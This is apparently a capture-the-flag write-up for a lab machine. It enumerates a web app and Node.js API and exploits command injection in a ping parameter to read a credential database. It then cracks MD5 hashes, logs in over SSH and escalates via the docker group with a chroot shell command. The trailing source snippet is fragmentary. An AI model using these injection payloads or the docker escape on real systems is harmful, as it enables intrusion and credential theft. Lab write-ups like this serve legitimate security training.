This system is quite interesting as it represents a mock web development company and some systems that they might make use of. It starts off with a Apache web server located on an odd port 31331 and a Node.js API instance located on port 8081. Enumerating the web application manually we find that the website makes two different endpoint calls to the node.js API. One for the login/authorization logic and another one to check the ping of the server. We find a command injection vulnerability through one of these API endpoints and then read a sensitive database file that grants us with a MD5 password hash that we then decrypt and login via SSH. Privilege Escalation on this machine involves identifying that the user is part of the _docker_ group and thus we find a GTFObins command to gain a root shell. 

## Initial recon
### Nmap scan

Lets start with an TCP SYN (-sS) version (-sV) scan of all (-p) TCP ports amd lets try to identify the operating system also (-O) and run default scripts (-sC).
Very verbose (-vv) output to see the open ports live as the scan runs and also output to all formats (-oA).

```
sudo nmap 10.10.61.233 -sS -sV -sC -O -vv -p- -oA tcp_all_ver_def
```

Lets also do a quick scan of the top 1000 default UDP ports and include its service version (-sUV)
```
sudo nmap 10.10.61.233 -sUV -vv -oA udp_ver_top_1000
```

#### TCP Results

Nothing interesting picked up on the UDP scan.

## Enumeration

Lets check out the Apache web server and inspect the web application for any interesting information and functionality.

Viewing the websites landing page source code reveals nothing interesting besides the fact the website is made using HTML and JavaScript.

Checking out the **robots.txt** file reveals the **/utech_sitemap.txt** URL file path. We check this out and it shows us an interesting **/partners.html** page that contains a login form.

![UltraTech Website](/Images/thm_ultratech_webpage_1.jpg)

Start BurpSuite, put the proxy intercept on and set your web browser to proxy to BurpSuite.

Fill out the login form and intercept the request in BurpSuite for further enumeration.

![BurpSuite proxy](/Images/thm_ultratech_burpsuite_1.jpg)

As you can see the login form makes a GET request to the following URL, note the host and port.
> http://10.10.61.233:8081/auth?login=admin&password=testpass

The web application also periodically makes another GET request to a different API endpoint path.
> http://10.10.61.233:8081/ping?ip=10.10.61.233 

![BurpSuite ping request capture](/Images/thm_ultratech_burpsuite_2.jpg)

Inspecting the source code for the **partners.html** web page that contains the login form makes a reference to a Javascript api file.
```
<script src='js/api.js'></script>
```

The source code from the **api.js** file

```javascript
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```

This explains the random ping GET requests and the form action path.

### Playing with the node.js API endpoint routes

We found the auth and ping routes by simply enumerating the web application with BurpSuite.
> http://10.10.61.233:8081/auth?login=admin&password=testpass
> http://10.10.61.233:8081/ping?ip=10.10.61.233 

You can run a directory scan using gobuster or dibuster and you should find the auth and ping routes easily also.

```

--------------------------------

```

I tried to do simple SQL injection into the auth endpoint login and password URL parameters to no avail.

The ping endpoint looks interesting and it takes and **ip** parameter. Lets see if we can get command injection using.

![Node.js API command injection](/Images/thm_ultratech_node_api_1.jpg)

As you can see we have command injection in the ip parameter for the ping API endpoint.
```
# List the contents of the current directory using ls, note we had to use the back ticks to make this work
http://10.10.61.233:8081/ping?ip=`ls`

# This shows us the tech.db.sqlite file, lets cat it to see its contents
http://10.10.61.233:8081/ping?ip=`cat%20utech.db.sqlite`
```

As you can see we get two usernames and what looks like their associated password hashes.

You can use **hash-identifier** on Kali Linux to identify what type of hash it is. It identifies them as MD5 hashes.

You can then use a cloud cracking website like [crackstation.net](https://crackstation.net/) to quickly crack MD5 hashes.

This will reveal both plaintext passwords.

## Privilege Escalation

The r00t users passwords works to allow us to SSH into the target system. Running a quick **id** command tells us that this user is part of the **docker** group which is interesting.

![Intial Shell](/Images/thm_ultratech_initial_shell.jpg)

Linpeas confirms our suspicions and states that the docker group seems to be a viable privilege escalation vector.

![Linpeas Results](/Images/thm_ultratech_linpeas.jpg)

Checking out [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell) for docker reveals the following command that can be used to gain root provided we are part of the docker group which we are as the r00t user.

```
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

![GTFOBins Docker](/Images/thm_ultratech_gtfo.jpg)

Using the above command we are able to get root privileges and then read the last flag container in the root users .ssh folder.

## Summary

This system is meant to represent a entity that uses a HTML and Javascript web application that interfaces with a node.js backend API that is contained in a docker container. The API source code and functionality is prone to command injection as the GET parameters sent to it our not sanitized correctly. Also the docker container was not setup correctly which lead to the privilege escalation attack. Refer to the references for further explanation of the docker PE vector and how to secure it.

## Notes

index.js source code that was responsible for the command injection.

```javascript
const express = require('express')

    }
})

    console.log(`UltraTech listening on ${PORT}`)
})
